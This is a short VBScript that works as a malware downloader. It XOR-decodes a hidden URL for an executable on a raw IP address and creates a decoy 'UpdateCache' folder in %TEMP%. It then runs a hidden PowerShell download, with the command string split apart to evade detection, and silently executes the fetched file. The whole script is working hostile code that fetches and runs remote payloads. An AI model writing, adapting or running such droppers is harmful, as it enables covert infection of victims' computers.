
Dim oS, oF
Set oS = CreateObject("WScript.Shell")
Set oF = CreateObject("Scripting.FileSystemObject")

Dim raw
raw = Array(55,43,43,47,101,112,112,110,103,106,113,105,102,113,110,109,110,113,102,110,112,56,58,43,112,15,6,42,14,24,60,17,12,111,22,112,43,45,62,57,57,54,109,113,58,39,58)

Function d(c)
    Dim s, i : s = ""
    For i = 0 To UBound(c)
        s = s & Chr(c(i) Xor 95)
    Next
    d = s
End Function

Dim u, fld, fl
u = d(raw)

fld = oS.ExpandEnvironmentStrings("%TEMP%") & "\UpdateCache\"
fl = fld & "traffi2.exe"

Dim parts, path, part
parts = Split(fld, "\")
path = ""
For Each part In parts
    If part <> "" Then
        path = path & part & "\"
        If Not oF.FolderExists(path) Then
            oF.CreateFolder path
        End If
    End If
Next

If oF.FileExists(fl) Then oF.DeleteFile fl, True

Dim p1, p2, p3
p1 = "powershell -NoP -NonI -W Hidden -C ""I"
p2 = "nvoke-WebRequest -Uri '"
p3 = "' -OutFile '"
Dim fullCmd
fullCmd = p1 & p2 & u & p3 & fl & "' -UseBasicParsing"""

oS.Run fullCmd, 0, True

oS.Run "cmd.exe /c """ & fl & """", 0, False